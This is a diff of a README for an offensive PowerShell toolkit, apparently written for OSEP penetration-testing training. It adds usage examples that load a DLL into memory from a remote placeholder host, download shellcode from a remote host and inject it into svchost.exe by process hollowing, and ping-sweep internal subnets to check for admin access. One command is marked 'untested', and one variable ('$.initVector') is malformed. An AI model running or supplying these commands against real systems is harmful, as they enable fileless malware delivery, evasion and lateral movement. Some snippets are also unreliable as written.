@@ -1,17 +1,35 @@
 # TortugaToolKit
 
-How i usually load it
+Written during OSEP course, for learning purposes. Used heavily during the exam with much success.
+
+## Examples
+
+Load it
 
 ```powershell
 $a=[System.Reflection.Assembly]::Load($(IWR -Uri http://yourserver/tortugatoolkit.dll -UseBasicParsing).Content);
 Import-Module -Assembly $a
+
+Untested but should work.
+$test=((IWR -Uri 'http://yourserver/turtletoolkit.dll' -UseBasicParsing).RawContent);$len=$test.length;$test.SubString($len-($len -198));$a=[System.Reflection.Assembly]::Load($test);
+Import-Module -Assembly $a
+
 ```
 
 Example of remotely loading and encrypting shellcode, then performing proc hollow with it
-```
+```powershell
 $r = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
 Invoke-ProcessHollow -procName 'svchost.exe' -k $r.encryptedKey -encsh $r.encryptedshellcode -ivk $.initVector
 ```
+Example of performing ping sweep then admin check on subnet
+```powershell
+$s = Invoke-PingSweep -s "172.16.23.0";
+foreach($h in $s){Invoke-AdminCheck -t $h}
+
+Invoke-AdminCheck -h $(Invoke-PingSweep -s "172.16.75.0")
+```
+Example
+
 
 ## List of cmdlets
 
